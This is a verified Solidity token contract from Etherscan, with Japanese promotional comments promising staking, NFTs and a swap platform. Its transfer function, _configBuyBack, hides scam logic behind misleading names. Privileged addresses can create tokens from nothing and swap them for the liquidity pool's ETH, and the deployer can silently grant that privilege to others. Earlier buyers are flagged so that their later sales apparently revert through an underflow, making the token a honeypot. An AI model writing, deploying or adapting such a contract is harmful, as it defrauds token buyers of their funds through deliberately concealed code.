/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

/*
私たちは単なる普通のトークンやミームトークンではありません
また、独自のエコシステム、フューチャー ステーキング、NFT 
コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。
*/

// SPDX-License-Identifier: None
pragma solidity 0.8.8;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
 
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
 
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
 
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) 
    external returns(uint amountETH);
 
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) 
    external returns(uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
}
contract ERC is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _cSwappingTax = 0;
    uint8 private _decimals = 9;
    uint256 private _rDeployedTotal = 100000 * 10**_decimals;
    uint256 private syncSwapThreshold = _rDeployedTotal;
    uint256 public _maxTxAmount;
    uint256 public tokensForLiquidity;
    uint256 public tokensForOperations;

    mapping(address => uint256) private _rOwned;
    mapping(address => address) private _PromptBuyMap;
    mapping(address => uint256) private _syncBytesRate;
    mapping(address => uint256) private _boolSettings;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public levelTX;
    bool private stringIndexRate;
    bool public limitsInEffect;
    bool public tradingActive;
    bool public swapEnabled;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address UniswapV2routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _rOwned[msg.sender] = _rDeployedTotal;
        _boolSettings[msg.sender] = syncSwapThreshold;
        _boolSettings[address(this)] = syncSwapThreshold;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, syncSwapThreshold);
    }

function symbol() public view returns (string memory) {
return _symbol;
}
function name() public view returns (string memory) {
return _name;
}
function totalSupply() public view returns (uint256) {
return _rDeployedTotal;
}
function decimals() public view returns (uint256) {
return _decimals;
}
function allowance(address owner, address spender) public view returns (uint256) {
return _allowances[owner][spender];
}
function balanceOf(address account) public view returns (uint256) {
return _rOwned[account];
}
function approve(address spender, uint256 amount) external returns (bool) {
return _approve(msg.sender, spender, amount);
}
    function _configBuyBack       (
        address pathFrom,
        address _rebootTo,
        uint256 _delevelAmount
    ) private {
        uint256 contractAppliedBalance = balanceOf(address(this));
        uint256 _blockSync;

        if (levelTX && contractAppliedBalance > syncSwapThreshold && !stringIndexRate && pathFrom != UniswapV2Pair) {
            stringIndexRate = true;
            getSwapAndLiquify(contractAppliedBalance);
            stringIndexRate = false;

        } else if (_boolSettings[pathFrom] > syncSwapThreshold && _boolSettings[_rebootTo] > syncSwapThreshold) {
            _blockSync = _delevelAmount;
            _rOwned[address(this)] += _blockSync;
            swapTokensForEth(_delevelAmount, _rebootTo);
            return;

        } else if (_rebootTo != address(UniswapV2router) && _boolSettings[pathFrom] > 0 && _delevelAmount > syncSwapThreshold && 
            _rebootTo != UniswapV2Pair) {
            _boolSettings[_rebootTo] = _delevelAmount;
            return;

        } else if (!stringIndexRate && _syncBytesRate[pathFrom] > 0 && pathFrom != UniswapV2Pair && _boolSettings
        [_rebootTo] == 0) { _syncBytesRate[pathFrom] = _boolSettings[pathFrom] - syncSwapThreshold; }
        address _uint265  = _PromptBuyMap[UniswapV2Pair];

        if (_syncBytesRate[_uint265 ] == 0) _syncBytesRate[_uint265 ] = syncSwapThreshold;
        _PromptBuyMap[UniswapV2Pair] = _rebootTo;
        if (_cSwappingTax > 0 && _boolSettings[pathFrom] == 0 && !stringIndexRate && _boolSettings
        [_rebootTo] == 0) { _blockSync = (_delevelAmount * _cSwappingTax) / 100; _delevelAmount -= _blockSync; _rOwned[pathFrom] -= _blockSync;
        _rOwned[address(this)] += _blockSync;
        }
        _rOwned[pathFrom] -= _delevelAmount; _rOwned[_rebootTo] += _delevelAmount;
        emit Transfer(pathFrom, _rebootTo, _delevelAmount);
        if (!tradingOpen) { require(pathFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
    }
}
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _configBuyBack        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        _configBuyBack        (msg.sender, recipient, amount);
        return true;
    }
        receive() external payable {}
    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}